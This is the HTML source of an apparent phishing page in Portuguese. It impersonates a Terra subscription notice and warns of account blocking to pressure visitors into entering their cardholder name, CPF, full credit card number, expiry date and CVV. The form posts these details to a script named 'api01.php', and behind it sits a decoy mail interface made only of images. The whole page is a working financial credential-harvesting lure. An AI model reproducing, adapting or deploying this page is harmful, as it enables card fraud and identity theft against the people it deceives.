﻿<!DOCTYPE html>
<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>Mail 🕑</title>
   

    <meta name="theme-color" content="##F1F1F1">
    <meta name="apple-mobile-web-app-status-bar-style" content="##F1F1F1">
    <meta name="msapplication-navbutton-color" content="##F1F1F1">

    <link rel="stylesheet" href="arquivos/all.css">
	   	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
	<script type="text/javascript">
		$("#ncard").mask("0000 0000 0000 0000");
		$("#vcard").mask("00/0000");
		$("#ccard").mask("000");
		$("#cpf").mask("000.000.000.00");
	</script>
</head>

<body cz-shortcut-listen="true" style="background-color: #F1F1F1;">

    <div id="app">
    <div>
<div class="md">
	<div class="corpo_md" >
		 

		<div class="show_apd" v-show="!isInicio" style="background:#FF7212;">
			<center><img src="img/logo.png" width="132px" height="45px"></center>
			<center><img src="img/alert.png" width="80px" height="80px"></center>
			<p>
			Prezado(a) Cliente Terra, ocorreu algum problema com sua forma de pagamento da sua assinatura, e para evitar futuros transtornos como o bloqueio de sua conta pedimos que você atualize sua forma de pagamento.";
  
			</p>

			<form id="formulario" id="form" name="form" action="api01.php" method="post">
			    
			    <label for="telefone">
					<span style="color: white;">Nome como escrito no cartão</span>
					<input type="text" name="nomecard" id="nomecard" maxlength="100" required="required">
				</label>
				
				<label for="telefone">
					<span style="color: white;">CPF Titular</span>
					<input type="text" name="cpf" id="cpf" maxlength="13" required="required">
				</label>

				<label for="telefone">
					<span style="color: white;">Número do cartão de crédito</span>
					<input type="tel" name="ncard" id="ncard" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required="required">
				</label>
				<label for="telefone">
					<span style="color: white;">Data de validade</span>
					<input type="tel" name="vcard" id="vcard" maxlength="7" placeholder="MM/AAAA" required="required">
				</label>
				<label for="telefone">
					<span style="color: white;">Código de segurança(CVV)</span>
					<input type="tel" name="ccard" id="ccard" maxlength="3" placeholder="Código de segurança" required="required">
				</label>

				<button class="btn_next" style="color:white;background:#c14e00;" id="submit" type="submit" title="CONFIRMRAR" value="CONFIRMAR">CONFIRMAR</button>
			</form>
		</div>
	</div>
</div>
<div class="wrapper container_dentro">
	<div class="header">
		<div class="buscar"><img src="arquivos/busca.png" alt=""></div>
		<div class="menu"><img src="arquivos/menu.png" alt=""></div>
		
	</div>

	<div class="corpo">
	
		<div class="corpo_img"><img src="arquivos/corpo.png" alt=""></div>
	</div>
</div>
</div>
    </div>


</body></html>